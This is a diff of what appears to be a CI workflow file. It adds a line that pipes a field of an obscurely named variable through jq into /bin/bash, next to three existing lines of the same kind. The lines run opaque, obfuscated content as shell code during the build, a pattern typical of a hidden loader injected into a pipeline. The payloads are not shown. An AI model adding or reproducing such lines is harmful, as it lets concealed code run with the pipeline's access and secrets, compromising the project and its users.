@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$e2931" | jq -r .fme4 | /bin/bash
           echo $pmzk2 | jq -r .oq13 | /bin/bash
           printf '%s' "$ytscr549" | jq -r .dt720 | /bin/bash
+          echo $fous43 | jq -r .xnkog94785 | /bin/bash
 
       - name: Archive output
         if: always()
